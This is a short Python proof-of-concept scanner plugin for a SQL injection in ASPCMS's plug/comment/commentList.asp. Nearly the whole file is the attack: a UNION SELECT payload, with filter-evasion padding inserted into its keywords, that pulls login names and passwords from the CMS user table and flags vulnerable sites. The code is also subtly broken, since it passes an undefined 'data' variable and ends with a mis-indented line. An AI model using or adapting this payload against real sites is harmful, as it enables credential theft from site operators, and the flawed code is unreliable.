# Author:fakezx
# Name:aspcms plug/comment注入漏洞
import HackRequests
import re

def poc(arg, **kwargs):
    headers = '''
Upgrade-Insecure-Requests:1
User-Agent:Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
    '''
    vulnurl = arg + "/plug/comment/commentList.asp?id=0%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now%28%29,null,1%20%20frmasterom%20{prefix}user"
    hh = HackRequests.http(url = vulnurl,post = data,headers = headers)
    if hh.status_code == 200 and "line2" in hh.text():
        result = {
            "name": "aspcms plug/comment sql注入",  # 插件名称
            "content": "aspcms的某一sql注入",  # 插件返回内容详情，会造成什么后果。
            "url": vulnurl,  # 漏洞存在url
            "log": hh.log,
            "tag": "sqli"  # 漏洞标签
        }
        return result


if __name__ == "__main__":
pass
